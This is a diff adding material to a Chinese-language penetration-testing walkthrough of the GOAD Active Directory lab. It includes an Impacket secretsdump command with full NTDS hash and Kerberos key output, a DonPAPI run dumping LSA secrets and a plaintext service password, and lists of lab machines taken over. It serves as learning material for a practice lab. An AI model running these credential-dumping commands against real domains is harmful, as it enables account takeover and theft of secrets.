@@ -77,11 +77,103 @@ ROBB.STARK::NORTH:f8ca94abf87f34dd:6630b0a3ff693b689b40402ea0eef3b1:010100000000
 
 ![BloodHound1](<images/BloodHound1.png>)
 
+直接用获得的robb.stark密码使用secretsdump就可以获取winterfell.north.sevenkingdoms.local的SAM数据库，但是靶场设计者没有这样做，我的推测是设计者想展示更多样的攻击手段，而不是止步于此，也可能BOT只能是管理员？
+
+```bash
+secretsdump -outputfile "winterfell.north.sevenkingdoms.local" -just-dc  "winterfell.north.sevenkingdoms.local"/"robb.stark":"sexywolfy"@"192.168.56.11"
+```
+
+```bash
+Impacket for Exegol - v0.10.1.dev1+20230719.222135.7a0ec36 - Copyright 2022 Fortra - forked by ThePorgs
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3b491c7e98b0e08aed021c5c69d422cb:::
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
+eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
+catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
+robb.stark:1113:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
+sansa.stark:1114:aad3b435b51404eeaad3b435b51404ee:2c643546d00054420505a2bf86d77c47:::
+brandon.stark:1115:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
+rickon.stark:1116:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::
+hodor:1117:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
+jon.snow:1118:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
+samwell.tarly:1119:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
+jeor.mormont:1120:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
+sql_svc:1121:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
+WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:41eed99c9436fd9358dfe33683758410:::
+CASTELBLACK$:1104:aad3b435b51404eeaad3b435b51404ee:7ece4bbc5022916aa87c76fd672f6739:::
+rbcd_const$:1123:aad3b435b51404eeaad3b435b51404ee:0c36f3e9a47d04ea89be82a0013b1643:::
+SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:d1359ba7e922b3bed17a21b94fe62363:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:e7aa0f8a649aa96fab5ed9e65438392bfc549cb2695ac4237e97996823619972
+Administrator:aes128-cts-hmac-sha1-96:bb7b6aed58a7a395e0e674ac76c28aa0
+Administrator:des-cbc-md5:fe58cdcd13a43243
+krbtgt:aes256-cts-hmac-sha1-96:3b2731f5b271fdcc76a94c2b6da7568da8db94c414337391e4b6f3c65adc068f
+krbtgt:aes128-cts-hmac-sha1-96:754f457c1a0f1e4c3ffda698db69ae13
+krbtgt:des-cbc-md5:517aae9146bcf757
+vagrant:aes256-cts-hmac-sha1-96:aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24
+vagrant:aes128-cts-hmac-sha1-96:0d7c6160ffb016857b9af96c44110ab1
+vagrant:des-cbc-md5:16dc9e8ad3dfc47f
+arya.stark:aes256-cts-hmac-sha1-96:2001e8fb3da02f3be6945b4cce16e6abdd304974615d6feca7d135d4009d4f7d
+arya.stark:aes128-cts-hmac-sha1-96:8477cba28e7d7cfe5338d172a23d74df
+arya.stark:des-cbc-md5:13525243d6643285
+eddard.stark:aes256-cts-hmac-sha1-96:f6b4d01107eb34c0ecb5f07d804fa9959dce6643f8e4688df17623b847ec7fc4
+eddard.stark:aes128-cts-hmac-sha1-96:5f9b06a24b90862367ec221a11f92203
+eddard.stark:des-cbc-md5:8067f7abecc7d346
+catelyn.stark:aes256-cts-hmac-sha1-96:c8302e270b04252251de40b2bd5fba37395b55d5ed9ac95e03213dc739827283
+catelyn.stark:aes128-cts-hmac-sha1-96:50ce7e2ad069fa40fb2bc7f5f9643d93
+catelyn.stark:des-cbc-md5:6b314670a2f84cfb
+robb.stark:aes256-cts-hmac-sha1-96:d7df5069178bbc93fdc34bbbcb8e374fd75c44d6ce51000f24688925cc4d9c2a
+robb.stark:aes128-cts-hmac-sha1-96:b2965905e68356d63fedd9904357cc42
+robb.stark:des-cbc-md5:c4b62c797f5dd01f
+sansa.stark:aes256-cts-hmac-sha1-96:cd2460a78e8993442498d3f242a88ae110ec6556e40c8add6aab12cfb44b3fa1
+sansa.stark:aes128-cts-hmac-sha1-96:18b9d10bd18d1956ba73c14426ec519f
+sansa.stark:des-cbc-md5:e66445757c31c176
+brandon.stark:aes256-cts-hmac-sha1-96:6dd181186b68898376d3236662f8aeb8fa68e4b5880744034d293d18b6753b10
+brandon.stark:aes128-cts-hmac-sha1-96:9de3581a163bd056073b71ab23142d73
+brandon.stark:des-cbc-md5:76e61fda8a4f5245
+rickon.stark:aes256-cts-hmac-sha1-96:79ffda34e5b23584b3bd67c887629815bb9ab8a1952ae9fda15511996587dcda
+rickon.stark:aes128-cts-hmac-sha1-96:d4a0669b1eff6caa42f2632ebca8cd8d
+rickon.stark:des-cbc-md5:b9ec3b8f2fd9d98a
+hodor:aes256-cts-hmac-sha1-96:a33579ec769f3d6477a98e72102a7f8964f09a745c1191a705d8e1c3ab6e4287
+hodor:aes128-cts-hmac-sha1-96:929126dcca8c698230b5787e8f5a5b60
+hodor:des-cbc-md5:d5764373f2545dfd
+jon.snow:aes256-cts-hmac-sha1-96:5a1bc13364e758131f87a1f37d2f1b1fa8aa7a4be10e3fe5a69e80a5c4c408fb
+jon.snow:aes128-cts-hmac-sha1-96:d8bc99ccfebe2d6e97d15f147aa50e8b
+jon.snow:des-cbc-md5:084358ceb3290d7c
+samwell.tarly:aes256-cts-hmac-sha1-96:b66738c4d2391b0602871d0a5cd1f9add8ff6b91dcbb7bc325dc76986496c605
+samwell.tarly:aes128-cts-hmac-sha1-96:3943b4ac630b0294d5a4e8b940101fae
+samwell.tarly:des-cbc-md5:5efed0e0a45dd951
+jeor.mormont:aes256-cts-hmac-sha1-96:be10f893afa35457fcf61ecc40dc032399b7aee77c87bb71dd2fe91411d2bd50
+jeor.mormont:aes128-cts-hmac-sha1-96:1b0a98958e19d6092c8e8dc1d25c788b
+jeor.mormont:des-cbc-md5:1a68641a3e9bb6ea
+sql_svc:aes256-cts-hmac-sha1-96:24d57467625d5510d6acfddf776264db60a40c934fcf518eacd7916936b1d6af
+sql_svc:aes128-cts-hmac-sha1-96:01290f5b76c04e39fb2cb58330a22029
+sql_svc:des-cbc-md5:8645d5cd402f16c7
+WINTERFELL$:aes256-cts-hmac-sha1-96:286c08d70729d10cbf5e8b3a3039a7c23c1b43e5b203ebafa7748b6df5f7e9a7
+WINTERFELL$:aes128-cts-hmac-sha1-96:9edd5764fa8d485bf23417522ecd9329
+WINTERFELL$:des-cbc-md5:23a28cc838cd8f40
+CASTELBLACK$:aes256-cts-hmac-sha1-96:c98b30aa71d1c633e7d138bc9b10625cf95bdb5eb2fb8f4a53330a34f0cf3356
+CASTELBLACK$:aes128-cts-hmac-sha1-96:9febbc6e09b5d83707168d6a8cb6cb8d
+CASTELBLACK$:des-cbc-md5:460b8c132a58c76d
+rbcd_const$:aes256-cts-hmac-sha1-96:b2797e5ce5eef123e88aceb3f4fc51fd59fe0b14e720217d7141f8a5abf60505
+rbcd_const$:aes128-cts-hmac-sha1-96:b44b6b76d70482a1f4d85b9c20ba6acc
+rbcd_const$:des-cbc-md5:758ff1c7a12f40cb
+SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:1eee7cb9a4f902debceee3e7c87cefbb1f9b9cac9771a4b0ddeb24977005c7ad
+SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:aab781581e6f90472126a49c0ac1bc50
+SEVENKINGDOMS$:des-cbc-md5:7a265858ea9eb0d9
+[*] Cleaning up... 
+```
+
 Eddard的密码比较强，用这个方法是破解不了的
 这并不意味着我们无能为力，我们可以做的是将 eddard 连接中继到unsigned smb 服务器
 
 > Responder 将日志保存在 /opt/tools/Responder/logs（在 exegol 上），如果您需要再次显示它们
-
+>
 > 如果要删除以前捕获的日志（消息跳过以前捕获的哈希）删除文件 /opt/tools/Responder/Responder.db
 
 目前获取的凭据：
@@ -95,6 +187,10 @@ Eddard的密码比较强，用这个方法是破解不了的
 * north.sevenkingdoms.local\jon.snow:iknownothing（Kerberoasting）
 
 * north.sevenkingdoms.local\robb.stark:sexywolfy （Responder）
+
+攻克机器：
+
+* north.sevenkingdoms.local
 
 ## NTLM Relay
 
@@ -265,7 +361,100 @@ proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
 proxychains DonPAPI -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
 ```
 
-> 笔者测试工具有bug，暂时跳过
+> 笔者测试工具有报错，只能收集一部分
+
+```bash
+
+                                                                                
+         ,                                                                      
+       ,                                                 LeHack Release! 💀                       
+        (                                                                       
+       .                                          by Touf & Zblurx @ Login-Securite                       
+                                &&&&&&                                                             
+     &&&&&%%%.                  &&&&&&                                          
+      &&&&%%%              &&&& &&&&&&       &&&&&&            &&&&&.           
+      &&&&%%%           &&&&&&& &&&&&&    &&&&&&&&&&&&&     &&&&&&&&&&&         
+      &&&&%%%         &&&&&&&&& &&&&&&  &&&&&&&&&&&&&&&&   &&&&&&&&&&&&&        
+    &&&&&&%%%%%       &&&&&&    &&&&&&  &&&&&&    &&&&&&   &&&&&   &&&&&   #####  
+ &&&&&&&&&%%%%%%%     &&&&&&&&&&&&&&&&  (&&&&&&&&&&&&&&&   &&&&&   &&&&&   # # #
+ &/&/////////////%      &&&&&&&&&&&&      &&&&&&&&&&&&     &&&&&   &&&&&   #####
+&&/&/#////////(//%         &&&&&&            &&&&&&        &&&&&   &&&&&    ###
+&&/&/////////////%        
+&&/&/////////////%        &&&&&&&&&        &&&&&&&&&&        &&&&&&&&&     &&&&&
+&&/&//////////(//%     &&&&&&&&&&&&&&    &&&&&&&&&&&&&&   &&&&&&&&&&&&&&   &&&&&
+&&/&/////////////%     &&&&&&   &&&&&&  &&&&&&   &&&&&&&  &&&&&&   &&&&&&  &&&&&
+&&/&///////////(/%    &&&&&&    &&&&&&  &&&&&&    &&&&&& &&&&&&    &&&&&&  &&&&&
+&&/&///(/////////%    &&&&&& &&&&&&&&&  &&&&&&&&& &&&&&& &&&&&& &&&&&&&&&  &&&&&
+&&/&/////////////%    &&&&&& &&&&&&&      &&&&&&& &&&&&& &&&&&& &&&&&&&    &&&&&
+&&#&###########/#%    &&&&&&                             &&&&&&                 
+&&###############%    &&&&&&                             &&&&&&                
+
+INFO Loaded 1 targets
+INFO [192.168.56.22] [+] CASTELBLACK (domain:north.sevenkingdoms.local) (Windows 10.0 Build 17763) [SMB Signing Disabled]
+INFO host: \\192.168.56.11, user: robb.stark, active:     8, idle:     8
+INFO Adding connected user robb.stark from \\192.168.56.11
+INFO host: \\192.168.56.106, user: eddard.stark, active:     0, idle:     0
+INFO Adding connected user eddard.stark from \\192.168.56.106
+INFO [192.168.56.22] [+] Found user .NET v2.0
+INFO [192.168.56.22] [+] Found user .NET v2.0 Classic
+INFO [192.168.56.22] [+] Found user .NET v4.5
+INFO [192.168.56.22] [+] Found user .NET v4.5 Classic
+INFO [192.168.56.22] [+] Found user All Users
+INFO [192.168.56.22] [+] Found user Classic .NET AppPool
+INFO [192.168.56.22] [+] Found user Default
+INFO [192.168.56.22] [+] Found user Default User
+INFO [192.168.56.22] [+] Found user Public
+INFO [192.168.56.22] [+] Found user robb.stark
+INFO [192.168.56.22] [+] Found user sql_svc
+INFO [192.168.56.22] [+] Found user vagrant
+INFO [192.168.56.22]  [+] Dumping LSA Secrets
+INFO [192.168.56.22] [+]  LSA :  winlogon#vagrant : vagrant 
+INFO [192.168.56.22] [-] Found DPAPI Machine key : 0x7fedf97b3cdc585d14d9019ad197d4c31f8b655d
+INFO [192.168.56.22] [-] Found DPAPI User key : 0xb30dc15bba504b3f1c6881b50bb485dd9308757c
+INFO [192.168.56.22] [-] Found DPAPI Machine key : 0x53759d319f4a23f1765fdb5cd983eaeb232182dd
+INFO [192.168.56.22] [-] Found DPAPI User key : 0x243f9f0a11073c08fb5150520c50265bf6c64b7b
+INFO [192.168.56.22] [+]  LSA :  NL$KM_history : 39fb46d843b6ece6ded7ce1c502daeb44f71e125bf5efb148614d6a30f93de420648f435b145837e1a9829d6451914d2c46657032bc50401ae3349cdd2e092ce 
+INFO [192.168.56.22] [+]  LSA :  _SC_MSSQL$SQLEXPRESS#north.sevenkingdoms.local\sql_svc : YouWillNotKerboroast1ngMeeeeee 
+INFO [192.168.56.22]  [+] Dumping SAM Secrets
+INFO [192.168.56.22] [+]  SAM : Collected 6 hashes 
+INFO [192.168.56.22] [+] Gathering DPAPI Secret blobs on the target
+INFO [192.168.56.22] [+]  
+[CREDENTIAL]
+LastWritten : 2023-08-10 16:31:41
+Flags       : 48 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x2 (CRED_PERSIST_LOCAL_MACHINE)
+Type        : 0x1 (CRED_PERSIST_SESSION)
+Target      : WindowsLive:target=virtualapp/didlogical
+Description : PersistedCredential
+Unknown     : 
+Username    : 02vsfjqjagxxlpgr
+Unknown3     : 
+ 
+INFO [192.168.56.22] [+] Gathering Wifi Keys
+INFO [192.168.56.22] [+] Gathering Vaults
+INFO [192.168.56.22] [+] Gathering Certificates Secrets 
+Traceback (most recent call last):
+  File "/root/.local/pipx/venvs/donpapi/lib/python3.9/site-packages/donpapi/lib/certificates.py", line 402, in loot_privatekeys
+    masterkey_guid = self.get_masterkey_guid_for_privatekey(data)
+  File "/root/.local/pipx/venvs/donpapi/lib/python3.9/site-packages/donpapi/lib/certificates.py", line 515, in get_masterkey_guid_for_privatekey
+    blob=PVKFile(privatekey_bytes)
+  File "/root/.local/pipx/venvs/donpapi/lib/python3.9/site-packages/impacket/structure.py", line 87, in __init__
+    self.fromString(data)
+  File "/root/.local/pipx/venvs/donpapi/lib/python3.9/site-packages/impacket/structure.py", line 152, in fromString
+    self[field[0]] = self.unpack(field[1], data[:size], dataClassOrCode = dataClassOrCode, field = field[0])
+  File "/root/.local/pipx/venvs/donpapi/lib/python3.9/site-packages/impacket/structure.py", line 382, in unpack
+    return dataClassOrCode(data)
+  File "/root/.local/pipx/venvs/donpapi/lib/python3.9/site-packages/impacket/structure.py", line 87, in __init__
+    self.fromString(data)
+  File "/root/.local/pipx/venvs/donpapi/lib/python3.9/site-packages/impacket/structure.py", line 152, in fromString
+    self[field[0]] = self.unpack(field[1], data[:size], dataClassOrCode = dataClassOrCode, field = field[0])
+  File "/root/.local/pipx/venvs/donpapi/lib/python3.9/site-packages/impacket/structure.py", line 326, in unpack
+    return self.unpack(two[0],data)
+  File "/root/.local/pipx/venvs/donpapi/lib/python3.9/site-packages/impacket/structure.py", line 385, in unpack
+    return unpack(format, data)[0]
+struct.error: ('unpack requires a buffer of 4 bytes', "When unpacking field 'CryptAlgo | <L=0 | b''[:4]'", 'When unpacking field \'Blob | : | b\'\\x01\\x00\\x00\\x00\\x9a\\xe4\\x0f#\\x85q\\xceI\\xbdG/\\xd2\\x19\\x97#8\\x00\\x00\\x00\\x00,\\x00\\x00\\x00C\\x00r\\x00y\\x00p\\x00t\\x00o\\x00A\\x00P\\x00I\\x00 \\x00P\\x00r\\x00i\\x00v\\x00a\\x00t\\x00e\\x00 \\x00K\\x00e\\x00y\\x00\\x00\\x00\\x03f\\x00\\x00\\xc0\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\xe5\\xb2\\x18%\\x84\\xc7v\\xbc\\x0f2\\x98I\\xef\\x84\\x1b\\xfa\\x00\\x00\\x00\\x00\\x04\\x80\\x00\\x00\\xa0\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\xda\\t\\xef\\xa0\\x87\\x0cA\\xd7\\xd4\\xaaT^\\x0c \\x8c\\x9f@\\x05\\x00\\x00\\xeeOw\\xec\\x8d)\\xcen\\xf2N-\\xff\\x8e\\x8e\\\'\\xfd9y\\xa4\\xe4\\x98\\xa9Q\\xce\\xee\\xb7\\xe5l`jA^5\\xa6\\x1a\\x08\\xd8\\x06D@\\x15\\x07rs\\xd8\\xe6\\\\\\xa9im\\xc4\\xe5\\xbfx\\xbdf\\xba\\xd1\\x8d\\x05\\xaf\\xd2]xN\\xddU10\\xb2l\\xbf\\xcc;\\xd7\\x1e\\xdb\\x01/\\xb06\\xa2\\xb2\\xb8\\xed\\xff)^\\x90\\xce\\xf2\\xe6\\xefU\\xac\\x07\\xae_X\\xae\\xe4h\\xaf \\xc0\\x165Q%a\\xa6\\x0b\\xde\\xaa\\x96\\xeaTC~\\x89\\xa0=\\xf5\\xb3<\\xaf\\xd3\\xed\\x02\\xb2\\xf3i\\x97N\\xbdU\\x9b\\xc9\\xde\\xc6\\x97\\n\\xe2\\x88`\\x11l\\xc4?\\xf8Y\\x1f\\x92\\x83V\\rF\\xd5\\xb2U\\x17\\xf4*|\\xbf\\x99?\\xebc\\xb2\\xf6WU\\xf2<\\xcfk\\x89\\xbe\\x07\\x88\\xfe\\x95:]s#*\\xf1u\\xfaE\\xde\\x18\\xbd\\xf2\\xd9\\x0b\\xd2\\x86 >\\xc6v\\xf7u\\xc7N,\\xb0\\x8dkw&\\x1e\\xcd\\xedD*\\x97\\x84\\xe0\\xdc\\x9fq\\xc8\\xa4U\\xeff\\xae\\xe1\\xac\\t\\x07\\x04\\xfb\\x0e\\x95\\xa4\\xb5\\x01\\x03\\xdb\\x0e\\t\\xef\\xdf\\xee7\\xf8\\x9d\\xda\\x07zD\\xd5\\x80L\\xc8\\xc5+\\xf2\\xe1\\x05\\x8d\\xa8\\xb9\\xc9\\xf2\\xe5t\\xd6\\xd1-\\xdb\\x106\\x92\\x18T\\xcf\\xd79\\xa8\\xfbAG\\x9d\\xd2\\xbe\\x13i\\xa8\\xc8\\xcaG>\\x05\\xf8"\\xa8Y\\xd7\\x03\\x83\\x9d\\xef\\xf7\\xde\\x14nu\\xd5*\\xf9;A\\x026;\\\\n\\xab\\xbf\\xcd)\\xd0m\\xfd\\xdd\\xff\\x1a\\xc38\\xd3\\x98\\x1b\\x83\\xb5\\xf5\\xa7\\xd5\\x8fbS\\xe6\\x13\\xbbt\\xb3\\xc8\\xda\\xa8%\\xa8\\x94\\xf3\\xde\\xc3\\x02ip\\x85^\\x1d\\xd0\\x7f\\xf1]\\xb84\\xb6\\x80\\x9e\\xd0),\\xc0[\\x1b*\\xd8<\\xb23\\x87?b\\xe4\\x82lI\\xe6W \\xaer\\xd2\\xe42wn\\x1d\\xa7{>M\\xba\\xc2\\\\[\\xa3\\rt\\xf9\\xc9\\xc5]\\x93U0\\x8d,\\x1c\\xe7\\xd7\\x8b\\xc5x\\x97h\\xa9C\\xf5o\\xa5\\xc9\\x1dEvw\\xaa\\xf4\\x81\\xb2\\x1b\\xd6\\xb9\\xba,\\xfe\\xd6]d\\xd6\\xc3{J\\xa4\\x0b\\xa750\\xb7:\\xc7\\xd0\\x9a\\xd1\\xae\\xf6\\xa9&\\xcd\\x16\\xaf\\xfb\\xfd\\xec\\xcen1l\\xcav)\\x08\\xd1\\xbf0\\x94\\xf1\\xfen\\xdb\\x8a\\xbeahvX\\x9f\\x85T\\xfc\\x9e\\xa3p(\\x1b\\xb3\\x82!*\\xd0h%\\xc2\\x90\\xe9?\\x0cA\\xc8\\x19\\xed9Im0+\\x83\\xad\\x0b\\x0eq\\xa9/\\xe0c\\x94\\x91\\xda \\xde\\x99zr\\x95X\\xa4\\x91v\\xc2\\xc6Sx\\xa0R\\x98\\x8a\\x85\\x98N\\\'\\x0f\\n\\xc1\\x0e\\\'\\x93X\\x93\\xba\\x01\\x19/c\\x11A\\x9abvZ\\xa8\\x87\\xad\\xe9XMW\\xb4d(@F\\x0c\\xc2\\xb6\\x8c\\xa6Y\\xefu\\xaf\\xa3\\xe9#\\x04\\xbf\\x87J\\\\\\xd3X\\x05,\\x8b\\x98\\xb6\\x028u\\xb3vx\\x01\\\\\\x7f\\xa8\\x89\\x0f\\x12\\x92\\xa1`\\xa6v#=\\x88\\xeb\\xa2\\xd5`\\x0c\\x1en\\xfc\\x03\\xf1%\\xf81Y\\xdf.I\\x1d\\xb3L\\xbb\\xc1ne\\x9e2\\x9a\\xd3\\xd8(\\xbb\\x8b\\x90\\xc7Df\\xf0y\\xf6\\x1b\\x1f\\x1c0oD\\xbd\\xe0\\xc5\\xe3\\xf4A\\xe8z\\x80fx\\xc5\\xdb\\xbdK#w\\xe2\\x9b\\xafsK`m\\x1di\\x04\\xa5\\x03\\xd0\\xe4\\xb5\\xea\\xe9i\\xfc\\x96\\xd5\\\\\\xcb;\\x92\\xa7\\xa2\\xf5\\xb3\\x99\\xd3\\xba\\xb3\\x1a\\xca\\x8c\\xaf\\x1eu.\\xc4\\x07^ y`\\x07$\\x95Tn\\x90n\\xcbd\\xd2\\x07\\xf8]\\xe6\\nLB\\x16\\xff\\x9e\\xc4\\xc2\\x9b\\xc8\\x90\\xa2\\x9f&\\xd5\\\'\\xe0n)\\xfc\\x7fo\\nQ\\xf2U\\x8b1\\xd1[\\xdf:\\xd1\\xda|\\xd0\\xc9]\\x17\\x82\\x90\\x8c{6\\xdf\\x1b\\x05\\x12=bN\\xe9gP\\x06G\\x12#\\xa5\\x00\\x03\\xbf\\x1d\\xa4\\xed^\\x15\\xdf\\xac\\xd9#\\x868\\xc3\\xc7\\x8ar\\xa9U\\xb2\\xeb\\x92\\xe0\\xd0\\xd8W\\xd1\\xc4\\xc7\\xe93a\\xba\\x8a\\x07\\xeb%\\xca\\xbf~\\xe28\\xf6\\xba\\xfe\\xfaI\\x18:4H\\x8c\\x1a\\xdaV6\\xdf\\xd8\\xa7\\x0b\\x86\\xe6\\x0f\\xca;n_\\\'n\\xcd.c%eW\\xa2SU\\xe2\\x19$NO\\x9f\\x0bc\\x95^T\\x8eKR\\x041\\x0f]c ;v\\xc2\\xc0\\xf3\\xc1v\\x90p\\xd1\\x8f\\xe8\\x88\\xdc\\xfd\\xde+*\\xc7\\xa5\\x8e\\xaf\\x86\\x98Z\\xdcT$\\xc6\\x97R\\xa4\\x9f\\xf9\\xa24l\\x1b\\x02B\\xc9\\x8cM\\x12\\x16\\x99\\x1c\\xb0\\x98\\x95\\xe3ZI\\xcc\\xc4\\x8e\\xb4\\xbe\\x11\\xe7\\x16og\\xd39\\xc3G\\xea\\x99\\xef\\x89\\x01l>8\\xde\\xa0\\x9d(\\xa3H\\xfd\\xc9\\x02\\x90\\xa8d\\\\\\x8e[\\xb8J/=\\xf1\\x94k\\x8e\\xfa\\xaf+\\xebw]\\x9a\\xd30\\x98~\\xaa\\xf0\\xcf\\x86,\\xcb\\\\\\t\\xaa\\xc5\\xb4\\xa4m\\xeb{\\t(\\x8c\\xbe0\\xaexo\\x8ej\\xde\\xf7\\x18\\x98\\x1a\\xb2\\x1a\\xa2\\xc8S{=h\\x10e\\xb7S\\x10\\xcemd\\xb9\\x01^\\xada\\xd5G\\xadh\\xcf\\xb0U\\x95S[\\x97\\xf5\\xd2@\\x89\\x1b\\xb7\\x1fO\\xf2U\\x9c\\r\\xceK\\xaf\\x83\\xeb\\xdal6t\\xe4\\x93\\x93I}k\\x06\\x90\\xafz\\xea\\x1d\\xa2]\\xef;\\x8a\\xc5;\\x9f\\x7f\\x19\\x02\\x1a\\xaa|\\x7fj]\\x1d\\x8b(\\t\\xcd7\\\'\\x0e\\xad\\x10\\xfa&\\xc4\\xba\\x87X#]?\\xc2\\x93{\\x8f_\\xcaj\\xf5\\x9b\\x04roZ\\x9a\\x93\\x9a\\xe7MW\\x81_\\xd3lxc[$3\\x065z-\\x91\\xf5\\xcc\\xfd{+\\xde\\xc5\\xf7\\xec\\x19\\x10\\xe4\\xc0\\xc7\\xfc\\x12J\\xdf\\xc4 \\xff\\x94u\\x1f]\\x91\\xaf\\xaf\\x0f7\\xf4\\x1c\\x9fm\\x90\\x1b\\xa2\\x99\\x87\\x10C\\xe8g\\x87\\xe6x\\xdb\\xd5\\xb2SFX\\xa5d+\\x85\\x9d\\x1fc\\x7f\\x9c4>\\xaf\\xea3}\\x9c\\xc8d:\\xb0Ji35 17\\x01\\xba\\x89\\xdeu_u*B\\xa4\\x03\\x08(\\xff\\xce\\xe9\\x02\\xbb\\x17\\xa5jxA)G\\xf2\\xce\\x16\\x01#\\x11et\\x7f\\x81\\xfc\\xbd3.3\\xfe\\xcel\\xb6\\x19\\x90\\xda\\x81\\x11\\xae\\x1c\\xeb\\xc5\\xa1\\xfc\\xc8i\\x17\\xccI\\xf3\\x0c<k\\xd5\\n\\xed\\xcfI\\xf8\\x14\\x00\\x00\\x00\\xb2\\xfb\\xa9\\x93\\r\\xa3:\\x1eG\\xfd$\\xc3hp\\x83\\x12,\\x14\\x0b\\xfd\\x01\\x00\\x00\\x00\\xd0\\x8c\\x9d\\xdf\\x01\\x15\\xd1\\x11\\x8cz\\x00\\xc0O\\xc2\\x97\\xeb\\x01\\x00\\x00\\x00\\x9a\\xe4\\x0f#\\x85q\\xceI\\xbdG/\\xd2\\x19\\x97#8\\x00\\x00\\x00\\x00\\x18\\x00\\x00\\x00E\\x00x\\x00p\\x00o\\x00r\\x00t\\x00 \\x00F\\x00l\\x00a\\x00g\\x00\\x00\\x00\\x03f\\x00\\x00\\xc0\\x00\\x00\\x00\\x10\\x00\\x00\\x00a4b.\\xce\\xef&\\x00&\\xe7\\xdc\\xa28\\xfd\\x1bL\\x00\\x00\\x00\\x00\\x04\\x80\\x00\\x00\\xa0\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\xd5>%\\x08\\x85\\x97e \\xf0\\xe1\\n\\xa8\\x9b*\\xea\\xd8\\x08\\x00\\x00\\x00\\xa8\\xb4+G\\x03\\x04\\xee\\xa3\\x14\\x00\\x00\\x00#\\xba\\xdd\\xee\\n\\x15\\xf664\\\\dX\\x8aW\\xabk\\x9a\\x8f\\xad\\xad\'[:1524]\'')
+
+```
 
 ### Smbclient
 
@@ -413,7 +602,7 @@ C:\Windows\system32>
 >
 > NTLM 认证消息嵌入在 SMB、HTTP、MSSQL、SMTP 和 IMAP 等应用协议的数据包中，LM 和 NTLM 认证协议是"独立于应用协议的"
 >
-> 这意味着可以将某个协议（例如 HTTP）中继 LM 或 NTLM 认证消息 到 另一个协议（例如 SMB）。这称为跨协议 LM/NTLM 中继。这也意味着可能的中继和攻击取决于认证消息嵌入的应用协议
+> 这意味着可以将某个协议（例如 HTTP）中继 LM 或 NTLM 认证消息 到 另一个协议（例如 SMB），这称为跨协议 LM/NTLM 中继，但也预示着跨协议中继攻击受到应用程序协议的制约
 > 下表总结了跨协议中继攻击的预期行为，具体取决于已经实施的缓解措施，表中列出的所有测试和结果均使用 Impacket 的 ntlmrelayx（Python）完成
 ![Alt text](images/ntlm_relau_mitigation_chart.webp)
 
@@ -632,6 +821,12 @@ LDAP-CHE... 192.168.56.12   389    MEEREEN          Channel Binding is set to "N
 LDAP-CHE... 192.168.56.10   389    KINGSLANDING     Channel Binding is set to "NEVER" - Time to PWN!
 LDAP-CHE... 192.168.56.11   389    WINTERFELL       Channel Binding is set to "NEVER" - Time to PWN!
 ```
+
+目前攻克机器：
+
+* north.sevenkingdoms.local
+* castelblack.north.sevenkingdoms.local
+* braavos.essos.local
 
 参考链接：
 
